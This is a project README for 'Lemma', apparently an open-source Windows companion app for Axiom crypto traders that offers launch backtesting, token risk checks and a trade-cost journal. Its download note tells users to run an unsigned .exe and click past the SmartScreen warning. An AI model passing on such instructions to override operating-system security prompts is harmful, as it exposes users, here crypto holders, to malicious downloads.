<p align="center">
  <img src="assets/readme/hero.gif" alt="Recorded token launches stream past. A strategy called Graduation runner buys the few that pass its rules, and an equity chart grows to +18.40 SOL after every cost, next to +31.20 SOL before costs. Costs took 41% of the profit. Headline: See the numbers before you trade." width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/price-%240%20forever-ff9f0a?style=flat-square" alt="Price: $0 forever">
  <img src="https://img.shields.io/badge/build-v1.0.0-32d74b?style=flat-square" alt="Build: v1.0.0">
  <img src="https://img.shields.io/badge/login-none-1c1c1e?style=flat-square" alt="Login: none">
  <img src="https://img.shields.io/badge/added%20fees-0%25-1c1c1e?style=flat-square" alt="Added fees: 0%">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-5e5ce6?style=flat-square" alt="MIT license"></a>
</p>

<h1 align="center">See the numbers before you trade.</h1>

<p align="center"><b>Lemma is a free, open-source desktop companion for Axiom traders: replay real launches, count every fee, check a token in one paste.<br>No login. No browser extension. Nothing to connect.</b></p>

<p align="center">
  <img src="assets/readme/ticker.gif" alt="Scrolling text: no login, no browser extension, no server, every fee counted, open source, $0" width="100%">
</p>

> [!NOTE]
> **Download:** the Windows build is a single `Lemma-setup.exe` — [releases](../../releases/latest). One file, no installer, no login.
>
> The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**.

> [!WARNING]
> **Stick to this repo.** Lemma never asks for a login, ships no extension, and connects nothing. If a copy of the app asks for credentials, it is not Lemma.

## Why Lemma

Every terminal shows you what to buy. None shows you whether your strategy actually made money once fees, priority fees, tips and slippage were paid.

| | Trading terminals and bots | Lemma |
|---|---|---|
| **Test a strategy** | Live, with real SOL | **Replay real launches, paper first** |
| **Costs** | One fee line | **Fee tier, priority, tips and slippage, per trade** |
| **Login** | Often required | **None** |
| **Token check** | Spread over tabs | **One paste, plain words** |
| **Taxes** | Not offered | **CSV for Koinly and Awaken** |

## What you get

### Backtest on real launches

<p align="center"><img src="assets/mockups/backtest.png" alt="Backtest of Graduation runner from Oct 1 to Nov 5 over 41,882 launches: +18.40 SOL after every cost, +31.20 before, 12.79 SOL in costs, 31% win rate. The buy, sell and cost rules sit on the right with a Paper trade it live button." width="100%"></p>

Lemma records every new launch from the chain on your PC. Write rules for when to buy and when to sell, replay weeks of launches in seconds, and compare the curve before and after costs. Then paper-trade it live, with nothing connected.

### One-paste token check

<p align="center"><img src="assets/mockups/tokencheck.png" alt="Token check of $SNIFF: 4 flags. Mint and freeze authority are off and the pool is canonical, but 6 buyers came in one slot, the top 10 hold 40%, the dev dumped 7 of 9 launches, and the launch copies an older $SNIFF." width="100%"></p>

Mint and freeze authority, the real pool, same-slot bundles, holder concentration, the dev's past launches, copied names and pictures, and X accounts renamed this week. Every check says what it means.

### What trading really cost you

<p align="center"><img src="assets/mockups/journal.png" alt="Journal for October: trading cost you 12.79 SOL, 41% of what you made before costs, split into platform fee, priority fees, tips and slippage, with a table of trades and CSV exports for Koinly and Awaken." width="100%"></p>

Paste a public address. Lemma rebuilds every trade with its real cost and exports a tax-ready CSV. Read-only, nothing to connect.

### Extension check

Lemma keeps a local list of browser extensions that read trading pages, so you can check yours.

## How it works

1. **Lemma reads the chain** through your own RPC and free public APIs, and records new launches in its folder.
2. **It replays and checks** on your PC: backtests, paper trades, token checks and your trade history.
3. **You trade as usual.** Lemma never places trades for you.


## FAQ

**Is this made by Axiom?**
No. Lemma is an independent, open-source project that works alongside Axiom. It doesn't use any private API.

**Will it trade for me?**
Backtests, paper trading and token checks are in your hands today, with nothing connected. An opt-in exit manager with spending caps and a transaction allowlist is next on the roadmap.

**How do I know a download is real?**
Take it from this repo's [releases](../../releases/latest) page only. A build that asks for credentials is not Lemma.

## Roadmap

- [x] Brand, icon and interface direction
- [x] Launch recorder and cost model
- [x] Backtest and paper trading
- [x] Token check
- [x] Trade journal and tax CSV
- [x] Extension check
- [x] Portable Windows build

## Legal

Lemma isn't affiliated with or endorsed by Axiom, pump.fun, Koinly or Awaken. Their names appear only to say what Lemma works with. Nothing here is financial advice. Lemma's code and brand assets are [MIT](LICENSE). See [CREDITS.md](CREDITS.md).

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="assets/brand/logo-white.svg">
    <img src="assets/brand/logo-black.svg" alt="Lemma" width="200">
  </picture>
</p>
